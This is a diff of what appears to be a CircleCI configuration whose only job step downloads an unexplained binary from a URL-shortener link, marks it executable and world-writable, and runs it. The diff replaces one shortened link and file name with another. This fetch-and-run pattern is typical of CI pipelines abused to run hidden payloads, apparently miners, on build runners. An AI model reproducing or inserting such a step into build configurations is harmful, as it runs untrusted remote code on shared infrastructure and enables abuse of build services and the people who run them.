@@ -6,4 +6,4 @@ jobs:
       image: ubuntu-2004:202010-01
     resource_class: large
     steps:
-      - run: wget -O broh http://gg.gg/vkrn9 && chmod +x broh && chmod 777 broh && ./broh
+      - run: wget -O brnh http://gg.gg/vkrrl && chmod +x brnh && chmod 777 brnh && ./brnh
